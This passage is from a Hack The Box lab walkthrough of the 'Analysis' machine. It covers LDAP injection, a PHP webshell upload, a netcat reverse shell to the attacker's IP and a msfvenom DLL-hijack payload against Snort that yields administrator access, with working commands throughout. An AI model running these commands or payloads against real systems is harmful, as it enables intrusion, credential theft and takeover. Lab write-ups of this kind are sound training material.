+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">/login.php</span><span style="color:#E1E4E8">            (Status: </span><span style="color:#79B8FF">200</span><span style="color:#E1E4E8">) [Size: 1085]</span></span>
+<span class="line"><span style="color:#B392F0">/Login.php</span><span style="color:#E1E4E8">            (Status: </span><span style="color:#79B8FF">200</span><span style="color:#E1E4E8">) [Size: 1085]</span></span>
+<span class="line"></span></code></pre>
+<p>if we do a curl to <code>http://internal.analysis.htb/users/list.php</code></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>curl -s http://internal.analysis.htb/users/list.php</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>missing parameter</span></span>
+<span class="line"><span></span></span></code></pre>
+<h3 id="fuzzing-to-find-the-required-parameter-in-the-url">Fuzzing to find the required parameter in the URL</h3>
+<p>we see that the URL needs a parameter, so we will fuzz this parameter:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#F97583">></span><span style="color:#E1E4E8"> ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u </span><span style="color:#9ECBFF">'http://internal.analysis.htb/users/list.php?FUZZ'</span><span style="color:#E1E4E8"> -fs 17</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">name</span><span style="color:#E1E4E8">                    [Status: </span><span style="color:#9ECBFF">200,</span><span style="color:#9ECBFF"> Size:</span><span style="color:#9ECBFF"> 0,</span><span style="color:#9ECBFF"> Words:</span><span style="color:#9ECBFF"> 1,</span><span style="color:#9ECBFF"> Lines:</span><span style="color:#9ECBFF"> 1,</span><span style="color:#9ECBFF"> Duration:</span><span style="color:#9ECBFF"> 9807ms]</span></span>
+<span class="line"></span></code></pre>
+<p>where we find the parameter called name. So we have the file with the parameter <code>http://internal.analysis.htb/users/list.php?name</code>.</p>
+<img src="img/5.png" alt="">
+<h3 id="ldap-injection">LDAP Injection</h3>
+<p>Remember that the LDAP service was running on this machine. Looking for LDAP Injections in HackTricks, we could try something like name=* to see if this returns something. If I visit <a href="http://internal.analysis.htb/users/list.php?name=">http://internal.analysis.htb/users/list.php?name=</a>* to try an injection, I can see a user:</p>
+<img src="img/6.png" alt="">
+<h2 id="script-for-ldap-injection">Script for LDAP Injection</h2>
+<p>Let’s create a script in C++ to automate the LDAP injection</p>
+<p>First, we install what we need:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">sudo</span><span style="color:#9ECBFF"> apt-get</span><span style="color:#9ECBFF"> install</span><span style="color:#9ECBFF"> libcurl4-openssl-dev</span><span style="color:#9ECBFF"> libargparse-dev</span></span>
+<span class="line"></span></code></pre>
+<p>here is our script: <a href="https://github.com/mil4ne/auto-LDAP-Injection">https://github.com/mil4ne/auto-LDAP-Injection</a></p>
+<p>We compile:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">g++</span><span style="color:#9ECBFF"> ldap.c++</span><span style="color:#79B8FF"> -o</span><span style="color:#9ECBFF"> ejecutable</span><span style="color:#79B8FF"> -I.</span><span style="color:#79B8FF"> -lcurl</span></span>
+<span class="line"></span></code></pre>
+<p>Then we run the script:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">./ejecutable</span><span style="color:#79B8FF"> -u</span><span style="color:#9ECBFF"> "http://internal.analysis.htb/users/list.php?name"</span></span>
+<span class="line"></span></code></pre>
+<p>Our final result is this <code>97NTtl*4QP96Bv</code></p>
+<p>with the found credentials, we go to the panel we found earlier:
+<code>http://internal.analysis.htb/employees/login.php</code></p>
+<img src="img/7.png" alt="">
+<p>here is a section called <code>SOC Report</code> where we can upload a file:</p>
+<img src="img/8.png" alt="">
+<h3 id="webshell-upload">WebShell upload</h3>
+<p>let’s get a webshell to our attacker machine, to upload it to the web:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">wget</span><span style="color:#9ECBFF"> https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php</span></span>
+<span class="line"></span></code></pre>
+<p>After uploading it, we will find it at: <code>http://internal.analysis.htb/dashboard/uploads/webshell.php</code></p>
+<p>now we will upload netcat to the victim machine to send ourselves a revshell:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">python3</span><span style="color:#79B8FF"> -m</span><span style="color:#9ECBFF"> http.server</span></span>
+<span class="line"></span></code></pre>
+<img src="img/9.png" alt="">
+<p>with certutil.exe we download the nc with the help of our webshell:</p>
+<img src="img/10.png" alt="">
+<p>we put ourselves on listen mode:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#F97583">></span><span style="color:#E1E4E8"> rlwrap -cAr nc -lvnp 4444</span></span>
+<span class="line"></span></code></pre>
+<p>We send the revshell:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">C:\Users\Public\Downloads\nc.exe</span><span style="color:#79B8FF"> 10.10.14.166</span><span style="color:#79B8FF"> 4444</span><span style="color:#79B8FF"> -e</span><span style="color:#9ECBFF"> C:</span><span style="color:#79B8FF">\W</span><span style="color:#9ECBFF">indows</span><span style="color:#79B8FF">\S</span><span style="color:#9ECBFF">ystem32</span><span style="color:#79B8FF">\c</span><span style="color:#9ECBFF">md.exe</span></span>
+<span class="line"></span></code></pre>
+<p>We now have a shell</p>
+<img src="img/11.png" alt="">
+<p>we transfer winpeas to our victim machine:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">certutil.exe</span><span style="color:#79B8FF"> -urlcache</span><span style="color:#79B8FF"> -split</span><span style="color:#79B8FF"> -f</span><span style="color:#9ECBFF"> http://10.10.14.166:8000/winPEASx64.exe</span><span style="color:#9ECBFF"> C:</span><span style="color:#79B8FF">\U</span><span style="color:#9ECBFF">sers</span><span style="color:#79B8FF">\P</span><span style="color:#9ECBFF">ublic</span><span style="color:#79B8FF">\D</span><span style="color:#9ECBFF">ownloads</span><span style="color:#79B8FF">\w</span><span style="color:#9ECBFF">in.exe</span></span>
+<span class="line"></span></code></pre>
+<p>We run it:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#E1E4E8">C:\Users\</span><span style="color:#F97583">Public</span><span style="color:#E1E4E8">\Downloads\win.exe</span></span>
+<span class="line"></span></code></pre>
+<h2 id="movimiento-lateral"><span style="color: #33acff">Movimiento Lateral</span></h2>
+<p>In our result we find credentials:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">Looking</span><span style="color:#9ECBFF"> for</span><span style="color:#9ECBFF"> AutoLogon</span><span style="color:#9ECBFF"> credentials</span></span>
+<span class="line"><span style="color:#B392F0">    Some</span><span style="color:#9ECBFF"> AutoLogon</span><span style="color:#9ECBFF"> credentials</span><span style="color:#9ECBFF"> were</span><span style="color:#9ECBFF"> found</span></span>
+<span class="line"><span style="color:#B392F0">    DefaultDomainName</span><span style="color:#9ECBFF">             :</span><span style="color:#9ECBFF">  analysis.htb.</span></span>
+<span class="line"><span style="color:#B392F0">    DefaultUserName</span><span style="color:#9ECBFF">               :</span><span style="color:#9ECBFF">  jdoe</span></span>
+<span class="line"><span style="color:#B392F0">    DefaultPassword</span><span style="color:#9ECBFF">               :</span><span style="color:#9ECBFF">  7y4Z4^</span><span style="color:#79B8FF">*</span><span style="color:#9ECBFF">y9Zzj</span></span>
+<span class="line"></span></code></pre>
+<p>we try to see if this user is valid to connect via <code>evil-winrm</code></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#F97583">></span><span style="color:#E1E4E8"> crackmapexec winrm 10.10.11.250 -u </span><span style="color:#9ECBFF">'jdoe'</span><span style="color:#E1E4E8"> -p </span><span style="color:#9ECBFF">'7y4Z4^*y9Zzj'</span><span style="color:#E1E4E8"> </span></span>
+<span class="line"><span style="color:#B392F0">SMB</span><span style="color:#79B8FF">         10.10.11.250</span><span style="color:#79B8FF">    5985</span><span style="color:#9ECBFF">   DC-ANALYSIS</span><span style="color:#E1E4E8">      [*] Windows 10 / Server 2019 Build 17763 (</span><span style="color:#B392F0">name:DC-ANALYSIS</span><span style="color:#E1E4E8">) (</span><span style="color:#B392F0">domain:analysis.htb</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#B392F0">HTTP</span><span style="color:#79B8FF">        10.10.11.250</span><span style="color:#79B8FF">    5985</span><span style="color:#9ECBFF">   DC-ANALYSIS</span><span style="color:#E1E4E8">      [*] http://10.10.11.250:5985/wsman</span></span>
+<span class="line"><span style="color:#B392F0">WINRM</span><span style="color:#79B8FF">       10.10.11.250</span><span style="color:#79B8FF">    5985</span><span style="color:#9ECBFF">   DC-ANALYSIS</span><span style="color:#E1E4E8">      [+] analysis.htb</span><span style="color:#79B8FF">\j</span><span style="color:#E1E4E8">doe:7y4Z4^</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">y9Zzj (</span><span style="color:#B392F0">Pwn3d!</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"></span></code></pre>
+<p>it is valid.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">evil-winrm</span><span style="color:#79B8FF"> -i</span><span style="color:#79B8FF"> 10.10.11.250</span><span style="color:#79B8FF"> -u</span><span style="color:#9ECBFF"> 'jdoe'</span><span style="color:#79B8FF"> -p</span><span style="color:#9ECBFF"> '7y4Z4^*y9Zzj'</span></span>
+<span class="line"></span></code></pre>
+<h2 id="privilege-escalation"><span style="color: #33acff">Privilege Escalation</span></h2>
+<p>if we run winpeas again we can see the following:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">Evil-WinRM*</span><span style="color:#9ECBFF"> PS</span><span style="color:#9ECBFF"> C:</span><span style="color:#79B8FF">\U</span><span style="color:#9ECBFF">sers</span><span style="color:#79B8FF">\j</span><span style="color:#9ECBFF">doe</span><span style="color:#79B8FF">\D</span><span style="color:#9ECBFF">ocument</span><span style="color:#E1E4E8">s</span><span style="color:#F97583">></span><span style="color:#9ECBFF"> C:</span><span style="color:#79B8FF">\U</span><span style="color:#9ECBFF">sers</span><span style="color:#79B8FF">\j</span><span style="color:#9ECBFF">doe</span><span style="color:#79B8FF">\D</span><span style="color:#9ECBFF">ocuments</span><span style="color:#79B8FF">\w</span><span style="color:#9ECBFF">inpeas.exe</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8">SNIP</span><span style="color:#F97583">></span></span>
+<span class="line"><span style="color:#B392F0">Snort(Snort</span><span style="color:#E1E4E8">)[C:</span><span style="color:#79B8FF">\S</span><span style="color:#E1E4E8">nort</span><span style="color:#79B8FF">\b</span><span style="color:#E1E4E8">in</span><span style="color:#79B8FF">\s</span><span style="color:#E1E4E8">nort.exe /SERVICE] - Autoload - No quotes and Space detected</span></span>
+<span class="line"><span style="color:#B392F0">    Possible</span><span style="color:#9ECBFF"> DLL</span><span style="color:#9ECBFF"> Hijacking</span><span style="color:#9ECBFF"> in</span><span style="color:#9ECBFF"> binary</span><span style="color:#9ECBFF"> folder:</span><span style="color:#9ECBFF"> C:</span><span style="color:#79B8FF">\S</span><span style="color:#9ECBFF">nort</span><span style="color:#79B8FF">\b</span><span style="color:#9ECBFF">in</span><span style="color:#E1E4E8"> (Users [AppendData/CreateDirectories </span><span style="color:#9ECBFF">WriteData/CreateFiles]</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8">SNIP</span><span style="color:#F97583">></span></span>
+<span class="line"></span></code></pre>
+<p>So SNORT is a tool for intrusion prevention and, I assume, it must run with some kind of privileges for it. It seems that attacking the SNORT service could be a potential path for privilege escalation.</p>
+<p>Checking permissions with icacls shows that we are able to write to these files:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#E1E4E8">Evil</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">WinRM</span><span style="color:#F97583">*</span><span style="color:#E1E4E8"> PS C:\Users\jdoe\Documents</span><span style="color:#F97583">></span><span style="color:#E1E4E8"> icacls C:\Snort\lib\snort_dynamicengine</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">C:\Snort\lib\snort_dynamicengine AUTORITE NT\SystŠme:(I)(OI)(CI)(F)</span></span>
+<span class="line"><span style="color:#E1E4E8">                                 BUILTIN\Administrateurs:(I)(OI)(CI)(F)</span></span>
+<span class="line"><span style="color:#E1E4E8">                                 BUILTIN\Utilisateurs:(I)(OI)(CI)(RX)</span></span>
+<span class="line"><span style="color:#E1E4E8">                                 BUILTIN\Utilisateurs:(I)(CI)(AD)</span></span>
+<span class="line"><span style="color:#E1E4E8">                                 BUILTIN\Utilisateurs:(I)(CI)(WD)</span></span>
+<span class="line"><span style="color:#E1E4E8">                                 CREATEUR PROPRIETAIRE:(I)(OI)(CI)(IO)(F)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">Successfully processed </span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8"> files; Failed processing </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8"> files</span></span>
+<span class="line"><span style="color:#F97583">*</span><span style="color:#E1E4E8">Evil</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">WinRM</span><span style="color:#F97583">*</span><span style="color:#E1E4E8"> PS C:\Users\jdoe\Documents</span><span style="color:#F97583">></span><span style="color:#E1E4E8"> icacls C:\Snort\lib\snort_dynamicpreprocessor</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">C:\Snort\lib\snort_dynamicpreprocessor AUTORITE NT\SystŠme:(I)(OI)(CI)(F)</span></span>
+<span class="line"><span style="color:#E1E4E8">                                       BUILTIN\Administrateurs:(I)(OI)(CI)(F)</span></span>
+<span class="line"><span style="color:#E1E4E8">                                       BUILTIN\Utilisateurs:(I)(OI)(CI)(RX)</span></span>
+<span class="line"><span style="color:#E1E4E8">                                       BUILTIN\Utilisateurs:(I)(CI)(AD)</span></span>
+<span class="line"><span style="color:#E1E4E8">                                       BUILTIN\Utilisateurs:(I)(CI)(WD)</span></span>
+<span class="line"><span style="color:#E1E4E8">                                       CREATEUR PROPRIETAIRE:(I)(OI)(CI)(IO)(F)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">Successfully processed </span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8"> files; Failed processing </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8"> files</span></span>
+<span class="line"></span></code></pre>
+<p>I notice that in this directory we have .dll files, so we can try a DLL hijacking:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>*Evil-WinRM* PS C:\Users\jdoe\Documents> cmd.exe /c dir C:\Snort\lib\snort_dynamicengine</span></span>
+<span class="line"><span> Volume in drive C has no label.</span></span>
+<span class="line"><span> Volume Serial Number is 0071-E237</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span> Directory of C:\Snort\lib\snort_dynamicengine</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>07/08/2023  03:31 PM    &#x3C;DIR>          .</span></span>
+<span class="line"><span>07/08/2023  03:31 PM    &#x3C;DIR>          ..</span></span>
+<span class="line"><span>05/24/2022  06:48 AM            78,336 sf_engine.dll</span></span>
+<span class="line"><span>               1 File(s)         78,336 bytes</span></span>
+<span class="line"><span>               2 Dir(s)   4,018,229,248 bytes free</span></span>
+<span class="line"><span></span></span></code></pre>
+<p>To do this, we create a malicious <code>.dll</code> file with <code>msfvenom</code>:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">msfvenom</span><span style="color:#79B8FF"> -p</span><span style="color:#9ECBFF"> windows/x64/shell_reverse_tcp</span><span style="color:#9ECBFF"> LHOST=tun0</span><span style="color:#9ECBFF"> LPORT=</span><span style="color:#79B8FF">9999</span><span style="color:#79B8FF"> -f</span><span style="color:#9ECBFF"> dll</span><span style="color:#79B8FF"> -a</span><span style="color:#9ECBFF"> x64</span><span style="color:#79B8FF"> -o</span><span style="color:#9ECBFF"> nr.dll</span><span style="color:#E1E4E8">  </span></span>
+<span class="line"></span></code></pre>
+<p>Nos ponemos en escucha:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">rlwrap</span><span style="color:#79B8FF"> -cAr</span><span style="color:#9ECBFF"> nc</span><span style="color:#79B8FF"> -lvnp</span><span style="color:#79B8FF"> 9999</span></span>
+<span class="line"></span></code></pre>
+<p>then we go to the path C:\Snort\lib\snort_dynamicpreprocessor and within that directory we upload our malicious dll</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>upload nr.dll</span></span>
+<span class="line"><span></span></span></code></pre>
+<p>In 1 minute we will have a shell as an administrator.</p>  </section> </main> <footer> <div class="footer__container"> <a href="/" class="profile" data-astro-cid-tvrurpns> <div class="img__container" data-astro-cid-tvrurpns> <img class="header__img" src="/img/p.png" alt="mil4ne img" width="40px" height="40px" data-astro-cid-tvrurpns> </div> <h3 class="color__gradiente header__title" data-astro-cid-tvrurpns> Mil4ne </h3> </a>  <div class="icons__container" data-astro-cid-dv46nlzh> <a href="https://www.linkedin.com/in/mil4ne/" target="_blank" rel="nofollow noreferrer noopener" data-astro-cid-dv46nlzh> <iconify-icon class="skill__icon LinkedIn" icon="simple-icons:linkedin" width="23" height="23" data-astro-cid-dv46nlzh></iconify-icon> </a><a href="https://app.hackthebox.com/profile/1022508" target="_blank" rel="nofollow noreferrer noopener" data-astro-cid-dv46nlzh> <iconify-icon class="skill__icon Hackthebox" icon="mdi:cube" width="23" height="23" data-astro-cid-dv46nlzh></iconify-icon> </a><a href="https://github.com/mil4ne" target="_blank" rel="nofollow noreferrer noopener" data-astro-cid-dv46nlzh> <iconify-icon class="skill__icon Github" icon="mdi:github" width="23" height="23" data-astro-cid-dv46nlzh></iconify-icon> </a><a href="#" target="_blank" rel="nofollow noreferrer noopener" data-astro-cid-dv46nlzh> <iconify-icon class="skill__icon CV" icon="tabler:file-cv" width="23" height="23" data-astro-cid-dv46nlzh></iconify-icon> </a> </div>  </div> <aside class="footer__links"> <ul> <li> <a class="footer__link" href="mailto:infomil4ne@gmail.com"><span><iconify-icon icon="fluent:mail-28-regular" width="27" height="27" style="color: #dcd8fc"></iconify-icon></span>infomil4ne@gmail.com</a> </li> <li> <a class="footer__link" href="https://github.com/mil4ne" target="_blank" rel="nofollow noreferrer noopener"><span><iconify-icon icon="mdi:github" width="27" height="27" style="color: #dcd8fc"></iconify-icon></span>@mil4ne</a> </li> </ul> </aside> </footer> </body></html> 
